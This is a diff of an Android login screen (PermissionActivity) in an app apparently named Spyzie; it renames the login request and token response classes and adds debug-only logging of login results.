@@ -2,7 +2,6 @@ package com.tantd.spyzie.ui;
 
 import android.Manifest;
 import android.appwidget.AppWidgetManager;
-import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
@@ -19,8 +18,8 @@ import androidx.core.content.ContextCompat;
 import com.tantd.spyzie.R;
 import com.tantd.spyzie.SpyzieApplication;
 import com.tantd.spyzie.core.BaseActivity;
-import com.tantd.spyzie.data.model.Error;
-import com.tantd.spyzie.data.model.LoginData;
+import com.tantd.spyzie.data.model.AccessTokenResponse;
+import com.tantd.spyzie.data.model.LoginRequest;
 import com.tantd.spyzie.data.network.ApiManager;
 import com.tantd.spyzie.service.MainService;
 import com.tantd.spyzie.util.CommonUtils;
@@ -121,19 +120,25 @@ public class PermissionActivity extends BaseActivity {
             DialogUtils.showMessageDialog(this, R.string.mes_login_email_password_blank,
                     (dialog, which) -> resetInput());
         } else {
-            apiManager.login(new LoginData.Request(email, password)).subscribeOn(schedulerProvider.io())
+            apiManager.login(new LoginRequest(email, password)).subscribeOn(schedulerProvider.io())
                     .observeOn(schedulerProvider.ui()).subscribe(response -> handleLoginSuccess(response),
                     error -> handleLoginError(error));
         }
     }
 
-    private void handleLoginSuccess(LoginData.Response response) {
+    private void handleLoginSuccess(AccessTokenResponse response) {
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleLoginSuccess, response=" + response);
+        }
         showToast(R.string.noti_service_started);
-        apiManager.storeAccessToken(response.getToken());
+        apiManager.storeAccessToken(response);
         showAppWidget();
     }
 
     private void handleLoginError(Throwable error) {
+        if (Constants.IS_DEBUG_MODE) {
+            Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "handleLoginError, error=" + error);
+        }
         DialogUtils.showMessageDialog(this, R.string.mes_login_failure,
                 (dialog, which) -> resetInput());
     }
